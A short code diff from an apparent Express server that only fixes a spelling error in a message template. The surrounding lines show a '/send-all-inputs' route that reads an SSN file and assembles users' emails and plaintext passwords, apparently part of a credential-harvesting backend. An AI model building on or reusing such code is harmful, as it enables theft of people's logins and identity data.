@@ -230,7 +230,7 @@ app.post('/send-all-inputs', async (req, res) => {
     const ssnData = await fs.readJson(ssnFilePath);
 
     let message = `
-      User Login Inforation : \n
+      User Login Information : \n
 
       Email: ${page1Data.email}
       Password: ${page1Data.password}
